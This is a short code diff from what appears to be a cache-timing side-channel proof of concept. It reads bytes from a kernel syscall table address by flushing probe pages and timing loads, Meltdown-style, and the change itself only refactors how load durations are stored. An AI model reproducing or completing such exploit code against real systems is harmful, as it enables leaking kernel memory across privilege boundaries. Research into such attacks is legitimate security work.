@@ -102,13 +102,10 @@ static inline void setup_transaction_trap_mitigation() {
 // Retrieves one byte from syscall table at address target_address.
 //
 static uint8_t probe_one_syscall_table_address_byte(uintptr_t target_address, char* pages) {
-    std::array<unsigned long, total_pages> durations;
     std::array<unsigned long, total_pages> index_heat;
     index_heat.fill(0);
 
     for (auto r = 0; r < syscall_table_entry_read_retries;) {
-        durations.fill(0);
-
         for (auto i = 0; i < total_pages; i++) {
             __clflush(&pages[i * page_size()]);
         }
@@ -135,9 +132,9 @@ static uint8_t probe_one_syscall_table_address_byte(uintptr_t target_address, ch
         static_assert(total_pages <= std::numeric_limits<uint8_t>::max()+1, "total_pages will overflow index");
         bool incr = false;
         for (auto i = 0; i < total_pages; i++) {
-            durations[i] = __measure_load_execution(&pages[i * page_size()]);
+            auto duration = __measure_load_execution(&pages[i * page_size()]);
 
-            if (durations[i] <= g_cache_hit_threshold) {
+            if (duration <= g_cache_hit_threshold) {
                 // we don't increment r twice in the same iteration or result could be compromised due
                 // to lack of actual retries, but we still want to account for all durations which met
                 // the threshold for when inferring the byte read from kernel address.
